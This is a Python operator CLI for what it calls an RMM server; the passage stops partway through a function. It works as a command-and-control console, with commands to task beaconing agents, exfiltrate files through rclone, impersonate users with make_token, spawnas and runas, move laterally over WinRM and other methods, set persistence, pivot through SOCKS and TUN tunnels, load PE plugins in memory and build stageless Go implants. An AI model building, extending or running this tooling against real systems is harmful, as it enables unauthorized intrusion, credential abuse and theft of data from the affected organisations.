#!/usr/bin/env python3
"""
RMM operator CLI — talks to the server REST API (/api/v1/).

Interactive (default):
  python rmm_cli.py
  python rmm_cli.py -i

One-shot / scripting:
  python rmm_cli.py sessions list
  python rmm_cli.py session use abc12345
  python rmm_cli.py exec whoami --wait 120
"""

from __future__ import annotations

from rmm_settings import MAX_BYTES as SETTINGS_MAX_BYTES, bootstrap, getenv as settings_getenv

if __name__ == "__main__":
    bootstrap("client")

import argparse
import base64
import glob
import json
import os
import queue
import shlex
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

# Line-buffered stdout so Exegol/Docker terminals show output immediately
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass

try:
    import readline
except ImportError:
    readline = None

try:
    from prompt_toolkit.completion import Completer as _PTCompleterBase
except ImportError:
    _PTCompleterBase = object

RMM_CLI_COMMANDS = [
    "bloodhound",
    "list",
    "use",
    "info",
    "background",
    "kill",
    "set_sleep",
    "set_jitter",
    "show_config",
    "download",
    "exfil",
    "rclone-config",
    "upload",
    "screenshot",
    "pe",
    "socks",
    "tun",
    "events",
    "exec",
    "spawn",
    "spawnas",
    "runas",
    "creds",
    "make_token",
    "rev2self",
    "lateral",
    "uid",
    "persist",
    "stop",
    "run",
    "health",
    "help",
    "?",
    "clear",
    "quit",
    "exit",
]

def _default_server_url() -> str:
    """Use an explicit operator URL, falling back to the local workspace service."""
    for key in ("RMM_SERVER_URL", "RMM_BASE_URL"):
        val = settings_getenv(key, "").strip().rstrip("/")
        if val:
            return val
    return "http://127.0.0.1:8787"


DEFAULT_URL = _default_server_url()
DEFAULT_TOKEN = settings_getenv("RMM_API_TOKEN", "").strip()
STATE_FILE = os.path.expanduser("~/.rmm_cli_state.json")
HISTORY_FILE = os.path.expanduser("~/.rmm_cli_history")
# Interactive mode: prompt_toolkit + patch_stdout (input line fixed at bottom).
_cli_use_ptk = False
_cli_output_queue: queue.Queue = queue.Queue()
_cli_output_lock = threading.Lock()
_main_thread_id: int | None = None
OUTPUT_DRAIN_INTERVAL = 0.15
EVENT_POLL_INTERVAL = 1.0


class RejectApiRedirects(urllib.request.HTTPRedirectHandler):
    """Keep operator credentials and request bodies on the configured endpoint."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        """Surface redirects as HTTP errors instead of forwarding credentials."""
        return None


class RmmApiClient:
    def __init__(self, base_url: str, token: str = "", extra_headers: dict | None = None):
        self.base_url = base_url.rstrip("/")
        self.token = token.strip()
        self.extra_headers = dict(extra_headers or {})
        self._opener = urllib.request.build_opener(RejectApiRedirects())

    def _headers(self, extra: dict | None = None) -> dict:
        h = {"Accept": "application/json"}
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
        if self.extra_headers:
            h.update(self.extra_headers)
        if extra:
            h.update(extra)
        return h

    def request(self, method: str, path: str, body: dict | None = None, timeout: float = 30):
        url = f"{self.base_url}{path}"
        data = None
        headers = self._headers()
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with self._opener.open(req, timeout=timeout) as resp:
                raw = resp.read().decode(errors="replace")
                if not raw.strip():
                    return resp.status, {}
                return resp.status, json.loads(raw)
        except urllib.error.HTTPError as e:
            raw = e.read().decode(errors="replace")
            try:
                payload = json.loads(raw) if raw.strip() else {}
            except json.JSONDecodeError:
                payload = {"error": raw or e.reason}
            return e.code, payload
        except urllib.error.URLError as e:
            return 0, {"error": "connection_failed", "detail": str(e.reason)}
        except (TimeoutError, socket.timeout):
            return 0, {"error": "timeout", "detail": "request timed out"}

    def health(self, timeout: float = 5):
        return self.request("GET", "/api/v1/health", timeout=timeout)

    def list_sessions(self):
        return self.request("GET", "/api/v1/sessions")

    def get_session(self, session_id: str):
        return self.request("GET", f"/api/v1/sessions/{session_id}")

    def kill_session(self, session_id: str):
        return self.request("DELETE", f"/api/v1/sessions/{session_id}")

    def queue_command(self, session_id: str, command: str, cmd_type: str = "oneshot"):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/commands",
            {"command": command, "type": cmd_type},
        )

    def exec_command(self, session_id: str, command: str, timeout: float = 120):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/exec",
            {"command": command, "timeout": timeout},
            timeout=timeout + 5,
        )

    def spawn_session(
        self,
        session_id: str,
        verify: bool = True,
        spawn_timeout: float = 120,
        register_timeout: float = 60,
        verify_timeout: float = 120,
    ):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/spawn",
            {
                "verify": verify,
                "spawn_timeout": spawn_timeout,
                "register_timeout": register_timeout,
                "verify_timeout": verify_timeout,
            },
            # Worst case: spawn wait + registration wait + two verification waits.
            timeout=spawn_timeout + register_timeout + 2 * verify_timeout + 30,
        )

    def make_token(self, session_id: str, domain: str = "", user: str = "", password: str = "", timeout: float = 120, cred_id: str = ""):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/make_token",
            {"timeout": timeout, **({"cred_id": cred_id} if cred_id else {"domain": domain, "user": user, "password": password})},
            timeout=timeout + 5,
        )

    def rev2self(self, session_id: str, timeout: float = 120):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/rev2self",
            {"timeout": timeout},
            timeout=timeout + 5,
        )

    def lateral_move(
        self,
        session_id: str,
        method: str,
        host: str,
        verify: bool = True,
        exec_timeout: float = 300,
        register_timeout: float = 60,
        verify_timeout: float = 120,
        https: bool = False,
        insecure: bool = False,
    ):
        if not isinstance(https, bool) or (https and method.strip().lower() != "winrm"):
            raise ValueError("https must be a boolean and is supported only for winrm")
        if not isinstance(insecure, bool) or (insecure and not https):
            raise ValueError("insecure must be a boolean and requires WinRM HTTPS")
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/lateral",
            {
                "method": method,
                "host": host,
                "verify": verify,
                "exec_timeout": exec_timeout,
                "register_timeout": register_timeout,
                "verify_timeout": verify_timeout,
                **({"https": True} if https else {}),
                **({"insecure": True} if insecure else {}),
            },
            # Worst case: lateral execution wait + registration + two verifications.
            timeout=exec_timeout + register_timeout + 2 * verify_timeout + 30,
        )

    def session_uid(self, session_id: str, timeout: float = 120):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/uid",
            {"timeout": timeout},
            timeout=timeout + 5,
        )

    # ── Credential store (workspace-scoped) ───────────────────────────────────

    def creds_add(self, domain: str, user: str, password: str):
        return self.request("POST", "/api/v1/creds",
                            {"domain": domain, "user": user, "password": password})

    def creds_del(self, cred_id: str):
        return self.request("DELETE", f"/api/v1/creds/{cred_id}")

    def creds_list(self):
        return self.request("GET", "/api/v1/creds")

    # ── Identity-aware process creation ───────────────────────────────────────

    def spawnas(self, session_id: str, cred_id: str = "", domain: str = "",
                user: str = "", password: str = "", verify: bool = True,
                spawn_timeout: float = 120, register_timeout: float = 60,
                verify_timeout: float = 120):
        body: dict = {"verify": verify, "spawn_timeout": spawn_timeout,
                      "register_timeout": register_timeout, "verify_timeout": verify_timeout}
        if cred_id:
            body["cred_id"] = cred_id
        else:
            body.update({"domain": domain, "user": user, "password": password})
        return self.request("POST", f"/api/v1/sessions/{session_id}/spawnas", body,
                            timeout=spawn_timeout + register_timeout + 2 * verify_timeout + 30)

    def runas(self, session_id: str, command: str, cred_id: str = "",
              domain: str = "", user: str = "", password: str = "",
              timeout: float = 120):
        body: dict = {"command": command, "timeout": timeout}
        if cred_id:
            body["cred_id"] = cred_id
        else:
            body.update({"domain": domain, "user": user, "password": password})
        return self.request("POST", f"/api/v1/sessions/{session_id}/runas", body,
                            timeout=timeout + 5)

    def patch_config(self, session_id: str, sleep_seconds=None, jitter_percent=None):
        body = {}
        if sleep_seconds is not None:
            body["sleep_seconds"] = sleep_seconds
        if jitter_percent is not None:
            body["jitter_percent"] = jitter_percent
        return self.request("PATCH", f"/api/v1/sessions/{session_id}/config", body)

    def upload_file(self, session_id: str, local_path: str, remote_path: str):
        if local_path.startswith("artifact:"):
            reference = local_path[len("artifact:"):]
            parts = reference.split("/")
            if (len(parts) != 2 or parts[0] not in {"agent-builds", "agent-deploy"}
                    or not parts[1] or any(c not in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-" for c in parts[1])
                    or parts[1] in {".", ".."}):
                return 400, {"error": "invalid_artifact_reference"}
            request = urllib.request.Request(
                f"{self.base_url}/api/v1/artifacts/{reference}", headers=self._headers()
            )
            try:
                with self._opener.open(request, timeout=60) as response:
                    payload = response.read()
            except urllib.error.HTTPError as exc:
                return exc.code, {"error": "artifact_download_failed"}
            except (urllib.error.URLError, TimeoutError, socket.timeout):
                return 0, {"error": "artifact_download_failed"}
        else:
            payload = Path(local_path).read_bytes()
        content = base64.b64encode(payload).decode()
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/upload",
            {"content_b64": content, "remote_path": remote_path},
        )

    def get_events(self, session_id: str, since: int = 0, limit: int = 50, forward: bool = False):
        return self.request(
            "GET",
            f"/api/v1/sessions/{session_id}/events?since={since}&limit={limit}" + ("&forward=1" if forward else ""),
        )

    def queue_download(self, session_id: str, remote_path: str):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/download",
            {"remote_path": remote_path},
        )

    def queue_exfil(
        self,
        session_id: str,
        remote_path: str,
        profile: str | None = None,
        dest: str | None = None,
        mode: str = "auto",
    ):
        body: dict = {"remote_path": remote_path}
        if profile:
            body["profile"] = profile
        if dest:
            body["dest"] = dest
        body["mode"] = mode
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/exfil",
            body,
        )

    def get_rclone_config(self):
        return self.request("GET", "/api/v1/rclone/config")

    def list_assets(self, kind: str | None = None):
        """List dynamic operator assets, optionally filtered by kind."""
        path = "/api/v1/assets" if not kind else f"/api/v1/assets/{kind}"
        return self.request("GET", path)

    def add_asset(self, kind: str, url: str, name: str | None = None, enabled: bool = True):
        """Download and install one dynamic operator asset from a URL."""
        body = {"url": url, "enabled": bool(enabled)}
        if name:
            body["name"] = name
        return self.request("POST", f"/api/v1/assets/{kind}", body)

    def set_asset_enabled(self, kind: str, name: str, enabled: bool):
        """Enable or disable one managed operator asset."""
        return self.request("PATCH", f"/api/v1/assets/{kind}/{urllib.parse.quote(name)}", {"enabled": bool(enabled)})

    def remove_asset(self, kind: str, name: str):
        """Remove one managed operator asset."""
        return self.request("DELETE", f"/api/v1/assets/{kind}/{urllib.parse.quote(name)}")

    def profile_status(self):
        """Return dynamic profile and beacon transport status."""
        return self.request("GET", "/api/v1/profile")

    def settings(self, values: dict | None = None):
        """Read redacted service settings or atomically save supplied overrides."""
        if values is None:
            return self.request("GET", "/api/v1/settings")
        return self.request("PATCH", "/api/v1/settings", {"settings": values})

    def start_profile(self, name: str = "", config: dict | None = None):
        """Start one installed RMM-Profile."""
        body = {"name": name}
        if config:
            body["config"] = config
        return self.request("POST", "/api/v1/profile", body, timeout=45)

    def stop_profile(self):
        """Stop the active RMM-Profile."""
        return self.request("POST", "/api/v1/profile", {"stop": True})

    def get_transport(self):
        """Return administration and beacon URLs."""
        return self.request("GET", "/api/v1/transport")

    def queue_screenshot(self, session_id: str):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/screenshot",
            {},
        )

    def bloodhound(self, action="preflight", run_id="", options=None):
        """Operate the BloodHound workflow at the connected storage owner."""
        return self.request("POST", "/api/v1/bloodhound", {
            "action": action, "run_id": run_id, "options": options or {},
        })

    def embedding_profiles(self, action="list", name="", config=None):
        """Manage reusable profiles at the server or local workspace API."""
        if action == "defaults":
            return self.request("GET", "/api/v1/embeddings/defaults")
        if action not in {"list", "get", "save", "delete"}:
            raise ValueError("invalid profile action")
        path = "/api/v1/embeddings/profiles"
        if action != "list":
            if not name:
                raise ValueError("profile name required")
            path += "/" + urllib.parse.quote(name, safe="")
        method = {"save": "POST", "delete": "DELETE"}.get(action, "GET")
        return self.request(method, path, {"config": config} if action == "save" else None)

    def run_embeddings(self, session_ref, profile, documents):
        """Queue explicit file or directory paths using a saved profile."""
        return self.request("POST", "/api/v1/embeddings/run", {
            "session_ref": session_ref, "profile": profile, "documents": documents,
        })

    def embedding_results(self, action="list", name="", session_ref="", event_id=0):
        """List, read, save, or delete a selected embedding result collection."""
        if action not in {"list", "get", "save", "delete"}:
            raise ValueError("invalid result action")
        path = "/api/v1/embeddings/results"
        if action in {"get", "delete"}:
            if not name:
                raise ValueError("result name required")
            path += "/" + urllib.parse.quote(name, safe="")
        method = {"save": "POST", "delete": "DELETE"}.get(action, "GET")
        body = {"session_ref": session_ref, "event_id": event_id} if action == "save" else None
        return self.request(method, path, body)

    def list_plugins(self):
        return self.request("GET", "/api/v1/plugins")

    def list_plugin_sources(self):
        """List repository and branch configurations saved by the storage owner."""
        return self.request("GET", "/api/v1/plugin-sources")

    def save_plugin_source(self, source_id, repository, branch="main", label="", credential_env="RMM_PLUGIN_GITHUB_TOKEN"):
        """Save a named plugin source using a service-side credential reference."""
        return self.request("POST", "/api/v1/plugin-sources/" + urllib.parse.quote(source_id, safe=""), {
            "repository": repository, "branch": branch, "label": label or source_id, "credential_env": credential_env,
        })

    def remove_plugin_source(self, source_id):
        """Remove source configuration without deleting installed plugins."""
        return self.request("DELETE", "/api/v1/plugin-sources/" + urllib.parse.quote(source_id, safe=""))

    def list_plugin_release(self, tag="latest", source="default"):
        """Resolve a published plugin release through the active server or workspace."""
        return self.request("GET", "/api/v1/plugin-releases?" + urllib.parse.urlencode({"tag": tag, "source": source}), timeout=150)

    def install_plugin_release(self, name, tag, sha256="", source="default", source_revision=""):
        """Install one plugin from an explicitly selected release into the asset store."""
        if not tag or tag == "latest":
            raise ValueError("select an exact release tag with plugin releases before installing")
        body = {"name": name, "tag": tag, "source": source}
        if sha256:
            body["sha256"] = sha256
        if source_revision:
            body["source_revision"] = source_revision
        return self.request("POST", "/api/v1/plugin-releases/install", body, timeout=240)

    def queue_pe_load(
        self,
        session_id: str,
        plugin: str,
        export: str = "Run",
        plugin_input: str = "",
        command: str | None = None,
    ):
        body = {"plugin": plugin, "export": export, "input": plugin_input}
        if command:
            body["command"] = command
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/pe",
            body,
        )

    def start_socks(self, session_id: str, port: int = 1080, bind_host: str = "127.0.0.1"):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/socks",
            {"port": port, "bind_host": bind_host},
        )

    def stop_socks(self, session_id: str):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/socks",
            {"stop": True},
        )

    def list_socks(self):
        return self.request("GET", "/api/v1/socks")

    def start_tun(
        self,
        session_id: str,
        device: str,
        route: str = "",
        tun_address: str = "198.18.0.1/15",
        interface: str = "",
        mtu: int = 1500,
        udp_timeout_seconds: int = 300,
        routes: list[str] | None = None,
    ):
        route_values = list(routes) if routes is not None else ([route] if route else [])
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/tun",
            {
                "device": device,
                "route": route or (route_values[0] if route_values else ""),
                "routes": route_values,
                "tun_address": tun_address,
                "interface": interface,
                "mtu": mtu,
                "udp_timeout_seconds": udp_timeout_seconds,
            },
        )

    def stop_tun(self, session_id: str):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/tun",
            {"stop": True},
        )

    def list_tun(self):
        return self.request("GET", "/api/v1/tun")

    def list_history(self):
        return self.request("GET", "/api/v1/history")

    def get_history_session(self, session_ref: str):
        return self.request("GET", f"/api/v1/history/{session_ref}")

    def get_history_events(self, session_ref: str, since: int = 0, limit: int = 500, forward: bool = False):
        return self.request(
            "GET",
            f"/api/v1/history/{session_ref}/events?since={since}&limit={limit}" + ("&forward=1" if forward else ""),
        )

    def delete_history(self, session_ref: str):
        return self.request("DELETE", f"/api/v1/history/{session_ref}")

    def clear_history(self):
        return self.request("DELETE", "/api/v1/history")

    def list_session_downloads(self, session_ref: str):
        return self.request("GET", f"/api/v1/sessions/{session_ref}/downloads")

    def list_artifacts(self, kind: str = "downloads"):
        """List global downloads or screenshots with agent metadata."""
        normalized = str(kind or "downloads").strip().lower()
        if normalized not in {"downloads", "screenshots"}:
            raise ValueError("artifact kind must be downloads or screenshots")
        query = urllib.parse.urlencode({"kind": normalized})
        return self.request("GET", f"/api/v1/artifacts?{query}")

    def get_agent_script(self):
        return self.request("GET", "/api/v1/agent/script")

    def list_ai_jobs(self, session_id=""):
        """List persisted AI jobs visible to the authenticated operator."""
        query = urllib.parse.urlencode({"session_id": session_id}) if session_id else ""
        return self.request("GET", "/api/v1/ai/jobs" + ("?" + query if query else ""))

    def get_ai_job(self, job_id):
        """Read persisted status and final output without starting another job."""
        return self.request("GET", "/api/v1/ai/jobs/" + urllib.parse.quote(job_id, safe=""))

    def deploy_agent_script(self, session_id="", sleep_seconds=60, jitter_percent=30, http_proxy="", workspace_id=""):
        """Render a configured client_rmm.ps1 server-side; the secret never leaves the server."""
        return self.request(
            "POST",
            "/api/v1/agent/deploy/script",
            {
                "session_id": session_id,
                "sleep_seconds": sleep_seconds,
                "jitter_percent": jitter_percent,
                "http_proxy": http_proxy,
                "workspace_id": workspace_id,
            },
            timeout=60,
        )

    def build_go_agent(self, goos="windows", goarch="amd64", config=None, use_server_config=True, stageless=False, debug=False):
        """Build the repository Go agent; use_server_config embeds the active URL and secret."""
        return self.request(
            "POST",
            "/api/v1/agent/go/build",
            {"goos": goos, "goarch": goarch, "config": config or {}, "use_server_config": use_server_config,
             "stageless": bool(stageless or debug), "debug": debug},
            timeout=180,
        )

    def stage_status(self, staging_id):
        """Read the stage1 launcher status recorded on the server for a staged build."""
        return self.request("GET", f"/api/v1/agent/go/stage/{staging_id}")


def load_state() -> dict:
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_state(state: dict):
    with open(STATE_FILE, "w", encoding="utf-8") as f:
        json.dump(state, f, indent=2)


def current_session(state: dict) -> str | None:
    return state.get("current_session")


def set_current_session(state: dict, session_id: str):
    state["current_session"] = session_id
    save_state(state)


def _ptk_emit(msg: str, *, err: bool = False) -> None:
    from prompt_toolkit import print_formatted_text
    from prompt_toolkit.formatted_text import ANSI

    with _cli_output_lock:
        if not msg:
            print_formatted_text("")
            return
        text = f"\x1b[91m{msg}\x1b[0m" if err else msg
        print_formatted_text(ANSI(text))


def _drain_cli_output() -> None:
    from prompt_toolkit import print_formatted_text
    from prompt_toolkit.formatted_text import ANSI

    with _cli_output_lock:
        while True:
            try:
                msg, err = _cli_output_queue.get_nowait()
            except queue.Empty:
                break
            if not msg:
                print_formatted_text("")
                continue
            text = f"\x1b[91m{msg}\x1b[0m" if err else msg
            print_formatted_text(ANSI(text))


def _output_drainer_loop(state: dict) -> None:
    """Flush queued agent/operator lines while the prompt is active (no Enter required)."""
    while state.get("interactive_running"):
        _drain_cli_output()
        time.sleep(OUTPUT_DRAIN_INTERVAL)


def say(msg: str = "", *, err: bool = False):
    if _cli_use_ptk:
        if _main_thread_id is not None and threading.current_thread().ident != _main_thread_id:
            _cli_output_queue.put((msg, err))
            return
        _ptk_emit(msg, err=err)
        return
    stream = sys.stderr if err else sys.stdout
    print(msg, file=stream)
    stream.flush()


def die(msg: str, code: int = 1):
    say(msg, err=True)
    sys.exit(code)


def warn(msg: str):
    say(msg, err=True)


def ensure_client(url: str, token: str | None = None) -> tuple:
    """Connect with explicit bearer auth, configured workspace auth, or default bearer auth."""
    url = (url or _default_server_url()).strip().rstrip("/")
    token = (token or "").strip()
    headers = {}
    if not token:
        workspace_id = settings_getenv("RMM_WORKSPACE_ID", "").strip()
        workspace_token = settings_getenv("RMM_WORKSPACE_TOKEN", "").strip()
        if workspace_id or workspace_token:
            if not workspace_id or not workspace_token:
                die("Set both RMM_WORKSPACE_ID and RMM_WORKSPACE_TOKEN; refusing to fall back to operator credentials.")
            headers = {"X-RMM-Workspace": workspace_id, "X-RMM-Workspace-Token": workspace_token}
        else:
            token = DEFAULT_TOKEN
    client = RmmApiClient(url, token, extra_headers=headers)

    say(f"Connecting to {url} ...", err=True)
    if headers:
        say("  Using workspace-scoped authentication", err=True)
    elif not token:
        say("  (no RMM_API_TOKEN — required unless server was started with --insecure)", err=True)
    code, data = client.health(timeout=5)

    if code == 0:
        detail = data.get("detail") or data.get("error") or "unknown error"
        die(
            f"Cannot connect to {url}\n"
            f"  {detail}\n"
            f"  Start the workspace service or single-workspace deployment.\n"
            f"  Use the workspace address reachable from this process.\n"
            f"  Example: export RMM_SERVER_URL=http://127.0.0.1:8787"
        )

    if code == 401:
        if headers:
            die(f"Workspace authentication failed (401) against {url}. Check RMM_WORKSPACE_ID and RMM_WORKSPACE_TOKEN. No operator-token fallback was attempted.")
        if not token:
            die(
                f"API authentication required by {url}\n"
                f"  The PowerShell client uses RMM_BEACON_SECRET — that is NOT enough for this CLI.\n"
                f"  export RMM_API_TOKEN='workspace-local-token'  # workspace RMM_WORKSPACE_LOCAL_TOKEN\n"
                f"  export RMM_SERVER_URL='{url}'  # operator workspace URL, not the beacon URL\n"
                f"  python rmm_cli.py --url \"$RMM_SERVER_URL\" --token \"$RMM_API_TOKEN\""
            )
        die(
            f"API authentication failed (401) against {url}\n"
            f"  Use the workspace-local operator token (central administrator token only for explicit central access)."
        )

    if code != 200:
        die(f"Server returned HTTP {code}: {data}")

    return client, data


def _session_matches_focus(state: dict, session_id: str) -> bool:
    """When a session is selected, show only its transcript (ordered queue/results)."""
    cur = current_session(state)
    if not cur:
        return True
    if session_id == cur:
        return True
    return session_id.startswith(cur) or cur.startswith(session_id[:8])


def _operator_label(body: str) -> str:
    b = body.strip()
    if ":" in b:
        action, cmd = b.split(":", 1)
        action = action.strip().capitalize()
        cmd = cmd.strip()
        return f"{action}: {cmd}" if cmd else action
    return b


def print_event(
    ev: dict,
    json_mode: bool = False,
    session_prefix: str | None = None,
    session_id: str | None = None,
    state: dict | None = None,
):
    if json_mode:
        print_json(ev)
        return
    if state is not None and session_id and not _session_matches_focus(state, session_id):
        return

    tag = f"[{session_prefix}] " if session_prefix else ""
    ev_type = ev.get("type", "output")
    body = (ev.get("body") or "").strip()
    cmd_echo = (ev.get("command") or "").strip()

    if ev_type == "config_ack":
        say("")
        say(f"[+] {tag}Config applied on agent")
        if body:
            say(f"    {body}")
        return

    if ev_type == "operator":
        say("")
        say(f"[>] {tag}{_operator_label(body)}")
        return

    if ev_type == "output":
        if cmd_echo:
            say(f"    └─ {tag}{cmd_echo}")
        if body:
            for line in body.splitlines():
                say(f"       {tag}{line}")
        else:
            say(f"       {tag}(no output)")
        return

    say("")
    say(f"[{ev['id']}] {tag}{ev_type}" + (f" » {cmd_echo}" if cmd_echo else ""))
    if body:
        for line in body.splitlines():
            say(f"    {tag}{line}")


def _event_cursor(state: dict) -> dict[str, int]:
    return state.setdefault("last_event_by_session", {})


def record_exec_cursor(state, session_id, response):
    """Never advance workspace transcript pagination from a central event identifier."""
    if response.get('event_id_scope') == 'central':
        return
    event = response.get('event') or {}
    _event_cursor(state)[session_id] = max(_event_cursor(state).get(session_id, 0), event.get('id', 0))


def _sync_event_cursor(client: RmmApiClient, state: dict, session_id: str) -> None:
    """Skip historical events when selecting a session (only show new activity)."""
    code, data = client.get_events(session_id, since=0, limit=500)
    cursor = _event_cursor(state)
    if code == 200:
        events = data.get("events", [])
        cursor[session_id] = max((e["id"] for e in events), default=0)
    else:
        cursor.setdefault(session_id, 0)


def session_or_none(state: dict, session_arg: str | None = None) -> str | None:
    return session_arg or current_session(state)


def require_session(state: dict, session_arg: str | None) -> str:
    sid = session_or_none(state, session_arg)
    if not sid:
        die("No session selected. Run: rmm_cli.py session use <id>")
    return sid


def print_json(data):
    print(json.dumps(data, indent=2))


def cmd_health(client: RmmApiClient, args):
    code, data = client.health()
    if args.json:
        print_json({"status": code, **data})
    elif code == 200:
        print(f"ok ({data.get('sessions', 0)} sessions)")
    else:
        die(f"health failed ({code}): {data}")


def cmd_sessions_list(client: RmmApiClient, args):
    code, data = client.list_sessions()
    if code != 200:
        die(f"sessions list failed ({code}): {data}")
    if args.json:
        print_json(data)
        return
    sessions = data.get("sessions", [])
    if not sessions:
        print("No active sessions")
        return
    print(f"{'ID':<10} {'User':<15} {'Host':<20} {'Sleep':<8} {'Jitter':<8} {'Last seen':<12} {'Status':<8}")
    print("-" * 95)
    for s in sessions:
        ago, status = _session_last_seen_display(s)
        print(
            f"{s['id'][:8]:<10} {s['username']:<15} {s['hostname']:<20} "
            f"{s['sleep_seconds']:<8} {s['jitter_percent']:<7}% "
            f"{ago:<12} {status:<8}"
        )


def cmd_session_use(client: RmmApiClient, state: dict, args):
    code, data = client.get_session(args.session_id)
    if code != 200:
        die(f"session not found ({code}): {data}")
    sid = data["session"]["id"]
    set_current_session(state, sid)
    s = data["session"]
    print(f"Selected {s['username']}@{s['hostname']} [{sid[:8]}]")


def cmd_session_info(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.get_session(sid)
    if code != 200:
        die(f"session info failed ({code}): {data}")
    if args.json:
        print_json(data)
    else:
        s = data["session"]
        for k, v in s.items():
            print(f"  {k}: {v}")


def cmd_session_kill(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.kill_session(sid)
    if code != 200:
        die(f"kill failed ({code}): {data}")
    if state.get("current_session") == data.get("session_id"):
        state.pop("current_session", None)
        save_state(state)
    print(f"Killed session {data.get('session_id', sid)[:8]}")


def cmd_run(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.queue_command(sid, args.command, args.type)
    if code != 200:
        die(f"queue failed ({code}): {data}")
    if args.json:
        print_json(data)
    else:
        print("Command queued")


def cmd_exec(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    command = args.command
    if not command and args.command_file:
        command = Path(args.command_file).read_text(encoding="utf-8").strip()
    if not command:
        die("Missing command")
    say(f"Waiting for agent (up to {args.wait:.0f}s)...", err=True)
    code, data = client.exec_command(sid, command, timeout=args.wait)
    if code == 408:
        die(f"timeout after {args.wait}s", 2)
    if code != 200:
        die(f"exec failed ({code}): {data}")
    ev = data.get("event", {})
    if args.json:
        print_json(ev)
        return
    if ev.get("command"):
        print(f"[{ev.get('type')}] {ev['command']}")
    body = ev.get("body", "")
    if ev.get("artifact"):
        print(f"artifact: {ev['artifact']}")
    print(body)


def cmd_spawn(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    say(f"Spawning detached Go agent from {sid[:8]} (waits for the next beacon)...", err=True)
    code, data = client.spawn_session(
        sid,
        verify=not args.no_verify,
        spawn_timeout=args.spawn_timeout,
        register_timeout=args.register_timeout,
        verify_timeout=args.verify_timeout,
    )
    if args.json:
        print_json(data)
        if code != 200 or (not data.get("ok") and not data.get("pending")):
            raise SystemExit(1)
        return
    if code != 200:
        detail = data.get("error") if isinstance(data, dict) else data
        die(f"spawn failed ({code})" + (f": {detail}" if detail else ""), 1)
    if not data.get("ok") and not data.get("pending"):
        print_json(data)
        die("Spawn unconfirmed: the expected agent has not registered. Inspect existing evidence before retrying.", 1)
    say(f"Requested session {data['spawned_session_id']} (pid {data.get('spawn_pid') or 'unconfirmed'})")
    if not data.get("verify"):
        say("Registration was not checked (--no-verify); this request remains unconfirmed.")
        return
    say(f"registered: {'yes' if data.get('registered') else 'no'}")
    if not data.get("registered"):
        warn("Spawn registration was not confirmed.")


def split_identity(raw: str) -> tuple[str, str]:
    """Split a DOMAIN\\user identity into its parts (user only stays as-is)."""
    raw = (raw or "").strip()
    if "\\" in raw:
        domain, _, user = raw.partition("\\")
        return domain.strip(), user.strip()
    return "", raw


def parse_identity_arguments(line: str) -> list[str]:
    """Parse quoted identity arguments while preserving literal backslashes."""
    lexer = shlex.shlex(line, posix=True)
    lexer.whitespace_split = True
    lexer.commenters = ""
    lexer.escape = ""
    return list(lexer)


def parse_credential_arguments(parts: list[str], *, with_command: bool = False) -> tuple[dict, str]:
    """Parse explicit stored credentials or a direct identity/password pair."""
    minimum = 3 if with_command else 2
    if len(parts) < minimum or (not with_command and len(parts) != minimum):
        raise ValueError("Expected -i <cred_id> or <identity> <password>" +
                         (" followed by a command" if with_command else ""))
    if parts[0] == "-i":
        if not parts[1].strip() or parts[1].startswith("-"):
            raise ValueError("A credential ID is required after -i")
        options = {"cred_id": parts[1]}
    else:
        if not parts[0].strip() or parts[0].startswith("-"):
            raise ValueError("Expected -i <cred_id> or <identity> <password>")
        _, user = split_identity(parts[0])
        if not user:
            raise ValueError("Missing user in identity")
        options = {"user": parts[0], "password": parts[1]}
    command = " ".join(parts[2:]) if with_command else ""
    if with_command and not command.strip():
        raise ValueError("A command is required")
    return options, command


def cmd_make_token(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    if args.cred_id is not None:
        if not args.cred_id.strip() or args.cred_id.startswith("-"):
            die("A credential ID is required after -i")
        if args.user is not None or args.password is not None:
            die("Use either -i <cred_id> or identity/password, not both")
        code, data = client.make_token(sid, cred_id=args.cred_id, timeout=args.timeout)
        if code != 200:
            die(f"make_token failed ({code}): {data.get('error')}")
        if args.json:
            print_json(data)
        else:
            say(data.get("output") or "(no output)")
        return
    if args.user is None or args.password is None:
        die("Provide -i <cred_id> or an identity and password")
    domain, user = split_identity(args.user)
    if not user:
        die("Missing user in identity (use DOMAIN\\user or user)")
    identity = f"{domain}\\{user}" if domain else user
    say(f"Creating network token for {identity} (waits for the next beacon)...", err=True)
    code, data = client.make_token(sid, domain, user, args.password, timeout=args.timeout)
    if args.json:
        print_json(data)
        return
    if code != 200:
        detail = data.get("error") if isinstance(data, dict) else data
